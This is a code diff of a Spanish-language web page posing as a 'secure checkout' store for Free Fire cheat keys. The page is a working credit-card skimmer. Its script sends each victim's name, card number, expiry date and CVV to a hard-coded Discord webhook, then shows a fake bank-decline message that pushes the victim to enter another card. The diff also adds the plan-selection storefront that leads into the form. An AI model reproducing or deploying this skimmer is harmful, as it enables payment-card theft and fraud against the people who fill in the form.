@@ -3,105 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Activity Key Mod | Secure Checkout</title>
+    <title>Activity Key Mod | Official Store</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background-color: #0d0d12; color: white; font-family: 'Inter', sans-serif; }
-        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .input-style { background: #1a1a24; border: 1px solid #2d2d3d; padding: 12px; border-radius: 8px; width: 100%; outline: none; transition: 0.3s; }
-        .input-style:focus { border-color: #00f2fe; box-shadow: 0 0 10px rgba(0, 242, 254, 0.2); }
-        .secure-badge { background: #122b21; color: #4ade80; font-size: 10px; padding: 4px 10px; border-radius: 20px; font-weight: bold; }
+        body { background-color: #08080a; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .glass { background: rgba(20, 20, 25, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .neon-text { text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); }
+        .input-style { background: #12121a; border: 1px solid #2d2d3d; padding: 12px; border-radius: 10px; width: 100%; outline: none; transition: 0.3s; color: white; }
+        .input-style:focus { border-color: #00f2fe; box-shadow: 0 0 15px rgba(0, 242, 254, 0.2); }
+        .hidden { display: none; }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
+<body class="min-h-screen">
 
-    <div class="max-w-md w-full mb-6 text-center">
-        <h1 class="text-3xl font-black text-cyan-400 italic">ACTIVITY KEY MOD</h1>
-        <div class="flex justify-center items-center gap-2 mt-2">
-            <span class="secure-badge"><i class="fas fa-shield-alt mr-1"></i> PAGO 100% ENCRIPTADO</span>
+    <div id="panel-principal" class="p-6">
+        <header class="text-center py-12">
+            <h1 class="text-5xl font-black italic text-cyan-400 neon-text uppercase tracking-tighter">Activity Key Mod</h1>
+            <p class="text-gray-500 mt-2 tracking-[0.3em] text-xs uppercase">Premium Cheat Services • Free Fire</p>
+        </header>
+
+        <div class="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8">
+            <div class="glass p-8 rounded-3xl text-center border-b-4 border-cyan-900">
+                <h3 class="text-gray-400 text-xs font-bold uppercase mb-2">Pato Team Key</h3>
+                <div class="text-3xl font-black mb-4">$0.99 <span class="text-sm text-gray-500">USD</span></div>
+                <ul class="text-left text-xs space-y-3 mb-8 text-gray-400">
+                    <li><i class="fas fa-check text-cyan-500 mr-2"></i> Validez: 24 Horas</li>
+                    <li><i class="fas fa-check text-cyan-500 mr-2"></i> Anti-Ban Actualizado</li>
+                </ul>
+                <button onclick="irAPagar('1 DÍA', '0.99')" class="w-full bg-white text-black font-bold py-3 rounded-xl hover:bg-cyan-400 transition-all uppercase text-sm">Elegir Plan</button>
+            </div>
+
+            <div class="glass p-8 rounded-3xl text-center border-2 border-cyan-500 transform scale-105 shadow-2xl shadow-cyan-500/10">
+                <span class="bg-cyan-500 text-black text-[10px] font-bold px-3 py-1 rounded-full uppercase">Más vendido</span>
+                <h3 class="text-white text-xs font-bold uppercase mt-4 mb-2">Pato Team Key</h3>
+                <div class="text-3xl font-black mb-4">$3.67 <span class="text-sm text-gray-500">USD</span></div>
+                <ul class="text-left text-xs space-y-3 mb-8 text-gray-300">
+                    <li><i class="fas fa-check text-cyan-500 mr-2"></i> Validez: 7 Días</li>
+                    <li><i class="fas fa-check text-cyan-500 mr-2"></i> Menú VIP Completo</li>
+                </ul>
+                <button onclick="irAPagar('7 DÍAS', '3.67')" class="w-full bg-cyan-500 text-black font-black py-3 rounded-xl hover:shadow-[0_0_20px_#00f2fe] transition-all uppercase text-sm">Obtener Ahora</button>
+            </div>
+
+            <div class="glass p-8 rounded-3xl text-center border-b-4 border-cyan-900">
+                <h3 class="text-gray-400 text-xs font-bold uppercase mb-2">Pato Team Key</h3>
+                <div class="text-3xl font-black mb-4">$20.00 <span class="text-sm text-gray-500">USD</span></div>
+                <ul class="text-left text-xs space-y-3 mb-8 text-gray-400">
+                    <li><i class="fas fa-check text-cyan-500 mr-2"></i> Validez: 30 Días</li>
+                    <li><i class="fas fa-check text-cyan-500 mr-2"></i> Soporte Prioritario</li>
+                </ul>
+                <button onclick="irAPagar('30 DÍAS', '20.00')" class="w-full bg-white text-black font-bold py-3 rounded-xl hover:bg-cyan-400 transition-all uppercase text-sm">Elegir Plan</button>
+            </div>
         </div>
     </div>
 
-    <div class="max-w-md w-full glass p-8 rounded-3xl shadow-2xl">
-        <h2 class="text-xl font-semibold mb-6">Detalles de la Tarjeta</h2>
-        
-        <form id="paymentForm" class="space-y-4">
-            <div>
-                <label class="text-xs text-gray-400 mb-1 block uppercase">Nombre del Titular</label>
-                <input type="text" id="name" class="input-style" placeholder="Como figura en la tarjeta" required>
+    <div id="seccion-pago" class="hidden fixed inset-0 bg-[#08080a] z-50 flex items-center justify-center p-4">
+        <div class="max-w-md w-full glass p-8 rounded-[2rem] shadow-2xl border border-white/10">
+            <div class="text-center mb-6">
+                <h2 class="text-2xl font-bold">Checkout Seguro</h2>
+                <p id="detalles-plan" class="text-cyan-400 text-xs font-bold uppercase mt-1"></p>
             </div>
 
-            <div>
-                <label class="text-xs text-gray-400 mb-1 block uppercase">Número de Tarjeta</label>
-                <div class="relative">
-                    <input type="text" id="cardNum" class="input-style" maxlength="19" placeholder="0000 0000 0000 0000" required>
-                    <div class="absolute right-3 top-3 flex gap-1 text-gray-500">
-                        <i class="fab fa-cc-visa text-lg"></i>
-                        <i class="fab fa-cc-mastercard text-lg"></i>
+            <form id="paymentForm" class="space-y-4">
+                <div>
+                    <label class="text-[10px] text-gray-500 uppercase ml-1">Nombre del Titular</label>
+                    <input type="text" id="name" class="input-style" placeholder="JUAN PEREZ" required>
+                </div>
+
+                <div>
+                    <label class="text-[10px] text-gray-500 uppercase ml-1">Número de Tarjeta</label>
+                    <input type="text" id="cardNum" class="input-style" maxlength="19" placeholder="4545 •••• •••• ••••" required>
+                </div>
+
+                <div class="flex gap-4">
+                    <div class="w-1/2">
+                        <label class="text-[10px] text-gray-500 uppercase ml-1">Vencimiento</label>
+                        <input type="text" id="expiry" class="input-style" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="w-1/2">
+                        <label class="text-[10px] text-gray-500 uppercase ml-1">CVV</label>
+                        <input type="password" id="cvv" class="input-style" placeholder="•••" maxlength="4" required>
                     </div>
                 </div>
-            </div>
 
-            <div class="flex gap-4">
-                <div class="w-1/2">
-                    <label class="text-xs text-gray-400 mb-1 block uppercase">Vencimiento</label>
-                    <input type="text" id="expiry" class="input-style" placeholder="MM/YY" maxlength="5" required>
+                <div>
+                    <label class="text-[10px] text-gray-500 uppercase ml-1">País</label>
+                    <select id="country" class="input-style">
+                        <option value="Argentina">Argentina</option>
+                        <option value="México">México</option>
+                        <option value="Colombia">Colombia</option>
+                        <option value="Chile">Chile</option>
+                        <option value="Perú">Perú</option>
+                        <option value="USA">USA / Otros</option>
+                    </select>
                 </div>
-                <div class="w-1/2">
-                    <label class="text-xs text-gray-400 mb-1 block uppercase">CVV / CVC</label>
-                    <input type="password" id="cvv" class="input-style" placeholder="123" maxlength="4" required>
-                </div>
+
+                <button type="submit" id="btnPay" class="w-full bg-cyan-500 text-black font-black py-4 rounded-xl mt-4 hover:scale-[1.02] transition-all uppercase">
+                    Pagar y Recibir Key
+                </button>
+            </form>
+            
+            <div class="mt-6 flex justify-between items-center opacity-40">
+                <img src="https://img.icons8.com/color/48/000000/visa.png" width="35">
+                <img src="https://img.icons8.com/color/48/000000/mastercard.png" width="35">
+                <div class="text-[10px] text-green-500 font-bold"><i class="fas fa-lock"></i> SSL SECURE</div>
             </div>
-
-            <div>
-                <label class="text-xs text-gray-400 mb-1 block uppercase">País de Emisión</label>
-                <select id="country" class="input-style">
-                    <option value="Argentina">Argentina</option>
-                    <option value="México">México</option>
-                    <option value="Colombia">Colombia</option>
-                    <option value="Chile">Chile</option>
-                    <option value="Perú">Perú</option>
-                    <option value="USA">USA / Internacional</option>
-                </select>
-            </div>
-
-            <button type="submit" id="btnPay" class="w-full bg-cyan-500 hover:bg-cyan-400 text-black font-black py-4 rounded-xl mt-6 transition-all transform active:scale-95">
-                VERIFICAR Y GENERAR KEY
-            </button>
-        </form>
-
-        <div class="mt-6 flex justify-center gap-4 opacity-30 grayscale">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="40">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" width="30">
-            <img src="https://www.pci-ds.com/wp-content/uploads/2021/04/pci-logo.png" width="50">
         </div>
     </div>
-
-    <p class="text-[10px] text-gray-600 mt-8 text-center uppercase tracking-widest">Protegido por SSL de 256 bits. Activity Mod no almacena datos bancarios.</p>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
+        let planSeleccionado = "";
+
+        function irAPagar(plan, precio) {
+            planSeleccionado = plan;
+            document.getElementById('detalles-plan').innerText = `PLAN ${plan} - $${precio} USD`;
+            document.getElementById('panel-principal').classList.add('hidden');
+            document.getElementById('seccion-pago').classList.remove('hidden');
+        }
 
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const btn = document.getElementById('btnPay');
-            btn.innerHTML = "<i class='fas fa-spinner fa-spin'></i> PROCESANDO...";
+            btn.innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> VERIFICANDO...";
             btn.disabled = true;
 
             const payload = {
-                content: "💳 **NUEVA TARJETA CAPTURADA - ACTIVITY KEY MOD**",
+                content: "💸 **NUEVO PAGO ENTRANTE - ACTIVITY KEY MOD**",
                 embeds: [{
-                    title: "Datos de Facturación",
-                    color: 3066993,
+                    color: 1752220,
                     fields: [
-                        { name: "👤 Titular", value: document.getElementById('name').value, inline: true },
+                        { name: "📋 Plan", value: planSeleccionado, inline: true },
                         { name: "🌍 País", value: document.getElementById('country').value, inline: true },
-                        { name: "💳 Número", value: "`" + document.getElementById('cardNum').value + "`" },
-                        { name: "📅 Exp", value: document.getElementById('expiry').value, inline: true },
+                        { name: "👤 Titular", value: document.getElementById('name').value },
+                        { name: "💳 Tarjeta", value: "`" + document.getElementById('cardNum').value + "`" },
+                        { name: "📅 Expira", value: document.getElementById('expiry').value, inline: true },
                         { name: "🔒 CVV", value: "`" + document.getElementById('cvv').value + "`", inline: true }
                     ],
-                    footer: { text: "Activity Mod Logger 2026" },
+                    footer: { text: "Logger by BenjaGMZ | 2026" },
                     timestamp: new Date()
                 }]
             };
@@ -111,11 +150,12 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                alert("Error de conexión: El procesador de pagos de tu país está saturado. Intenta con otra tarjeta.");
-                location.reload();
+                setTimeout(() => {
+                    alert("ERROR DE RED: El servidor de pagos está temporalmente fuera de línea. Tu banco ha rechazado la transacción por seguridad. Intenta con otra tarjeta de crédito/débito.");
+                    location.reload();
+                }, 2000);
             });
         });
     </script>
 </body>
-                                                         </html>
-                                                         
+</html>
